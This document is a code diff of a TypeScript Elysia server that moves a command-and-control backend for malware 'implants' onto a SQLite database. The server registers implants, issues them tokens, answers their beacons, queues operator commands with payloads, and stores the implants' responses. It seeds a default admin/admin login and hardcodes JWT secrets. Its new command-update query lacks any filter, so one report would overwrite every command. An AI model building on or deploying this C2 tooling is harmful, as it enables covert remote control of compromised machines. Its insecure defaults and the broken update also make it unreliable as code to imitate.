@@ -1,47 +1,38 @@
 import { Elysia, t } from 'elysia';
 import { jwt } from '@elysiajs/jwt';
 import { swagger } from '@elysiajs/swagger';
+import { drizzle } from 'drizzle-orm/bun-sqlite';
+import * as schema from './db/schema';
+import { eq } from 'drizzle-orm';
+import { createInsertSchema } from 'drizzle-typebox';
 
-enum CommandStatus {
-  Queued = 'Queued',
-  Executing = 'Executing',
-  Completed = 'Completed',
-  Failed = 'Failed',
-}
+const usersInsertSchema = createInsertSchema(schema.users);
+const commandsInsertSchema = createInsertSchema(schema.commands);
 
-interface Command {
-  id: string;
-  implantId: string;
-  type: string;
-  payload?: any;
-  status: CommandStatus;
-  response?: any;
-}
-
-interface Implant {
-  id: string;
-  lastSeenAt: Date;
-}
+const db = drizzle(process.env.DB_FILE_NAME!, { schema });
 
 const app = new Elysia()
+  .onStart(async () => {
+    await db
+      .insert(schema.users)
+      .values({ username: 'admin', password: await Bun.password.hash('admin') })
+      .onConflictDoNothing({ target: schema.users.username });
+  })
   .use(swagger())
   .use(
     jwt({
       name: 'implantJWT',
       secret: 'implent JWT secret',
-      schema: t.Object({ id: t.String() }),
+      schema: t.Object({ id: t.Number() }),
     }),
   )
   .use(
     jwt({
       name: 'clientJWT',
       secret: 'client JWT secret',
+      schema: t.Object({ username: t.String() }),
     }),
   )
-  .state({
-    implants: {} as Record<string, Implant>,
-    commands: {} as Record<string, Command>,
-  })
   .macro(({ onBeforeHandle }) => ({
     isSignIn(enabled: boolean) {
       if (!enabled) return;
@@ -63,11 +54,17 @@ const app = new Elysia()
   .post(
     '/auth/signin',
     async ({ body: { username, password }, error, clientJWT }) => {
-      if (username !== 'admin' || password !== 'admin') {
+      const user = await db.query.users.findFirst({
+        where: (users, { eq }) => eq(users.username, username),
+      });
+
+      if (!user || !(await Bun.password.verify(password, user.password))) {
         return error(401, { success: false, message: 'Invalid credentials' });
       }
 
-      const token = await clientJWT.sign({});
+      const token = await clientJWT.sign({
+        username,
+      });
 
       return {
         success: true,
@@ -76,19 +73,26 @@ const app = new Elysia()
       };
     },
     {
-      body: t.Object({
-        username: t.String(),
-        password: t.String(),
-      }),
+      body: t.Pick(usersInsertSchema, ['username', 'password']),
     },
   )
-  .get('/implants', ({ store: { implants } }) => Object.values(implants), {
-    isSignIn: true,
-  })
+  .get(
+    '/implants',
+    async () => {
+      const implants = await db.query.implants.findMany();
+      return implants;
+    },
+    {
+      isSignIn: true,
+    },
+  )
   .get(
     '/implants/:id',
-    ({ store: { implants }, error, params: { id } }) => {
-      const implant = implants[id];
+    async ({ error, params: { id } }) => {
+      const implant = await db.query.implants.findFirst({
+        where: (implants, { eq }) => eq(implants.id, id),
+      });
+
       if (!implant) {
         return error(404, { success: false, message: 'Implant not found' });
       }
@@ -98,67 +102,79 @@ const app = new Elysia()
         implant,
       };
     },
-    { params: t.Object({ id: t.String() }), isSignIn: true },
+    { params: t.Object({ id: t.Number() }), isSignIn: true },
   )
-  .post('/implants', async ({ store: { implants }, implantJWT }) => {
-    const id = crypto.randomUUID();
-    implants[id] = { id, lastSeenAt: new Date() };
+  .post('/implants', async ({ implantJWT }) => {
+    const implant = (
+      await db.insert(schema.implants).values({}).returning()
+    )[0];
 
-    const token = await implantJWT.sign({ id });
+    const token = await implantJWT.sign({ id: implant.id });
 
     return {
       success: true,
       message: 'Implant created',
       token,
-      implant: implants[id],
+      implant,
     };
   })
   .get(
     '/implants/beacon',
-    async ({
-      store: { implants, commands },
-      implantJWT,
-      headers: { authorization },
-      error,
-    }) => {
+    async ({ implantJWT, headers: { authorization }, error }) => {
       const jwtPayload = await implantJWT.verify(authorization);
 
       if (jwtPayload == false) {
         return error(401, { success: false, message: 'Unauthorized' });
       }
 
-      const id = jwtPayload.id;
-
-      const implant = implants[id];
+      const implantId = jwtPayload.id;
+      const implant = await db.query.implants.findFirst({
+        where: (implants, { eq }) => eq(implants.id, implantId),
+        with: {
+          commands: {
+            where: (commands, { eq }) => eq(commands.status, 'Queued'),
+            orderBy: (commands, { asc }) => [asc(commands.createdAt)],
+          },
+        },
+      });
       if (!implant) {
         return error(404, { success: false, message: 'Implant not found' });
       }
 
-      implant.lastSeenAt = new Date();
-
-      const commandsToSend = Object.values(commands).filter(
-        (command) =>
-          command.implantId == id && command.status == CommandStatus.Queued,
-      );
+      await db
+        .update(schema.implants)
+        .set({
+          lastSeenAt: new Date(),
+        })
+        .where(eq(schema.implants.id, implant.id));
 
       return {
         success: true,
         message: 'Implant updated',
         implant,
-        commands: commandsToSend,
       };
     },
     {
       headers: t.Object({ authorization: t.String() }),
     },
   )
-  .get('/commands', ({ store: { commands } }) => Object.values(commands), {
-    isSignIn: true,
-  })
+  .get(
+    '/commands',
+    async () => {
+      const commands = await db.query.commands.findMany();
+      return commands;
+    },
+    {
+      isSignIn: true,
+    },
+  )
   .get(
     '/commands/:id',
-    ({ store: { commands }, params: { id }, error }) => {
-      const command = commands[id];
+    async ({ params: { id }, error }) => {
+      const command = await db.query.commands.findFirst({
+        where: (commands, { eq }) => eq(commands.id, id),
+      });
+
       if (!command) {
         return error(404, { success: false, message: 'Implant not found' });
       }
@@ -170,32 +186,31 @@ const app = new Elysia()
     },
     {
       params: t.Object({
-        id: t.String(),
+        id: t.Number(),
       }),
       isSignIn: true,
     },
   )
   .post(
     '/commands',
-    ({
-      store: { implants, commands },
-      error,
-      body: { implantId, type, payload },
-    }) => {
-      const implant = implants[implantId];
+    async ({ error, body: { implantId, type, payload } }) => {
+      const implant = await db.query.implants.findFirst({
+        where: (implants, { eq }) => eq(implants.id, implantId),
+      });
       if (!implant) {
         return error(404, { success: false, message: 'Implant not found' });
       }
 
-      const command: Command = {
-        id: crypto.randomUUID(),
-        implantId,
-        type: type,
-        status: CommandStatus.Queued,
-        payload,
-      };
-
-      commands[command.id] = command;
+      const command = (
+        await db
+          .insert(schema.commands)
+          .values({
+            implantId,
+            type,
+            payload,
+          })
+          .returning()
+      )[0];
 
       return {
         success: true,
@@ -204,11 +219,7 @@ const app = new Elysia()
       };
     },
     {
-      body: t.Object({
-        implantId: t.String(),
-        type: t.String(),
-        payload: t.Optional(t.Any()),
-      }),
+      body: t.Pick(commandsInsertSchema, ['implantId', 'type', 'payload']),
       isSignIn: true,
     },
   )
@@ -218,7 +229,6 @@ const app = new Elysia()
       params: { id: commandId },
       headers: { authorization },
       body: { status, response },
-      store: { implants, commands },
       implantJWT,
       error,
     }) => {
@@ -229,32 +239,41 @@ const app = new Elysia()
       }
 
       const implantId = jwtPayload.id;
-      const implant = implants[implantId];
+      const implant = await db.query.implants.findFirst({
+        where: (implants, { eq }) => eq(implants.id, implantId),
+      });
       if (!implant) {
         return error(404, { success: false, message: 'Implant not found' });
       }
 
-      const command = commands[commandId];
-      if (!command || command.implantId != implantId) {
+      const command = await db.query.commands.findFirst({
+        where: (commands, { and, eq }) =>
+          and(eq(commands.id, commandId), eq(commands.implantId, implantId)),
+      });
+      if (!command) {
         return error(404, { success: false, message: 'Command not found' });
       }
 
-      command.status = status;
-      command.response = response;
+      const updated_command = (
+        await db
+          .update(schema.commands)
+          .set({
+            status: status,
+            response,
+          })
+          .returning()
+      )[0];
 
       return {
         success: true,
         message: 'Command updated',
-        command,
+        command: updated_command,
       };
     },
     {
-      params: t.Object({ id: t.String() }),
+      params: t.Object({ id: t.Number() }),
       headers: t.Object({ authorization: t.String() }),
-      body: t.Object({
-        status: t.Enum(CommandStatus),
-        response: t.Optional(t.Any()),
-      }),
+      body: t.Pick(commandsInsertSchema, ['status', 'response']),
     },
   )
   .listen(3000);
